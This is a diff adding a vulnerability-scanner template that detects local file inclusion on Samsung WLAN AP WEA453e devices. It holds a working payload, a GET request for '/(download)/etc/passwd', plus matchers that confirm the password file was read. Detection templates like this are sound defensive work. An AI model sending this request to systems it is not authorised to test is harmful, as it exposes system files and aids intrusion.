@@ -1,0 +1,30 @@
+id: "samsung-wlan-ap-lfi"
+name: "Samsung WLAN AP WEA453e - Local File Inclusion"
+severity: "high"
+description: "Samsung WLAN AP WEA453e is susceptible to local file inclusion vulnerabilities."
+tech:
+  - "generic"
+tags:
+  - "xss"
+  - "samsung"
+  - "lfi"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://omriinbar.medium.com/samsung-wlan-ap-wea453e-vulnerabilities-7aa4a57d4dba"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/(download)/etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
+      - "bin:.*:1:1"
+  - type: "status"
+    status:
+      - 200
